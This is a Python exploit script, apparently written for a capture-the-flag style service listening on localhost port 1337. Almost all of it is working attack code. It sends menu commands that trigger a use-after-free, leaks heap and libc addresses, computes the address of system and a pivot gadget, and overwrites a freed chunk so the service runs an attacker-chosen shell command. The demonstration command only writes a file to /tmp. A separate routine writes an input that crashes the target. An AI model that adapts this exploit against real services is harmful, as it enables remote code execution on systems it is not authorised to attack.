import struct
import os
import sys
from sys import argv
from socket import *

HOST = "127.0.0.1"
PORT = 1337

def get_s():
	s = socket()
	s.settimeout(3)
	s.connect((HOST, PORT))
	return s

def pad(data, length):
	if len(data) > length:
		print("[*] err - data length > %d" % length)
	return data + chr(0) * (length - len(data))
	
def enter_child(idx):
	return "1\n%s\n"%(str(idx))

def leave_child():
	return "2\n"

def del_child(idx):
	return "10\n%s\n"%(str(idx))

def add_list():
	return "6\n"

def list_child(addition = None):
	line = "3"
	if addition != None:
		return line + addition + "\n"
	return line + "\n"

def add_string(data):
	return "4\n%s\n"%data

def add_int(val):
	return "5\n%d\n"%val

def copy(idx):
	return "8\n%d\n"%idx

def paste():
	return "9\n"

def update(idx, new_val):
	line = "7\n%d\n"%idx
	if isinstance(new_val, str):
		line += "%s\n"%new_val
	return line

def crash_with_huge_malloc():
	print("[*] huge_alloc running")
	exploit = ""
	exploit += add_string("A"*0x10)
	exploit += copy(0)
	exploit += update(0, "Z"*0x50)

	fake="C"*0x10
	exploit += list_child(fake)

	exploit += paste()

	open("input_exploit", "wb").write(exploit)

def recv_data(s):
	data = ""
	while True:
		try:
			data += s.recv(1024)
		except Exception, exp:
			break
	return data

def info_disc(s):
	print("[*] info_disc running")
	exploit = ""
	exploit += add_string("A"*0x10)
	exploit += copy(0)
	exploit += update(0, "Z"*0x50)	
	for i in xrange(3):
		exploit += add_list()
	exploit += paste()
	exploit += list_child()
	
	s.send(exploit)
	return recv_data(s)

def execute_code(s, cmd):
	print("[*] execute_code running")	
	exploit = ""

	# create the dangling pointer
	exploit += add_string("A"*(0x20)) #0x10
	exploit += add_string("A2"*0x10)

	exploit += copy(0)
	exploit += update(0, "Z"*0x74)
	
	# call consolidate --> empty all fastbins
	exploit += add_string("C1"*0x400)

	# allocate list childs over the freed string object
	for i in xrange(77):
		exploit += add_list()
	
	exploit += paste()

	exploit += list_child()
	s.send(exploit)
	data = recv_data(s)
	chunk_addr, system_addr = get_addrs(data)
	
	# nice pivot from libc
	pivot = system_addr + 0xeaa77

	exploit = ""
	exploit += del_child(80)
	exploit += add_list()
	exploit += paste()

	length = 0xe4
	data = struct.pack("<Q", pivot)
	data += struct.pack("<Q", chunk_addr-0x38)
	data += "C"*0x8
	data += struct.pack("<Q", system_addr)
	data += struct.pack("<Q", chunk_addr-0x80) * 5

	data += pad(cmd, 0x60)

	data += struct.pack("<Q", chunk_addr-0x80) * ((length-len(data))/8 - 1)

	data += struct.pack("<Q", chunk_addr - 0x80+0x8)
	data += "E"*(length - len(data))
	exploit += update(81, data)
	

	exploit += list_child()
	s.send(exploit)
	return recv_data(s)

def get_addrs(data):
	small_idx = data.rfind("A2A2A2")
	fast_idx = data.rfind("0:80")

	small_bins = struct.unpack("<Q", data[small_idx+0x26:small_idx+0x26+8])[0]
	fast_bins = struct.unpack("<Q", data[fast_idx+52:fast_idx+52+8])[0]
	system_offset = 0x3808d8
	system_addr = small_bins - system_offset
	print("[*] chunk == 0x%x"%fast_bins)
	print("[*] system == 0x%x"%system_addr)
	return fast_bins, system_addr

if __name__ == "__main__":
	if len(argv) > 1:
		PORT = int(argv[1])

	s = get_s()
	cmd = "echo ILoveIDA>/tmp/poc"
	print("[*] attack with cmd == %s" % cmd)
	execute_code(s, cmd)
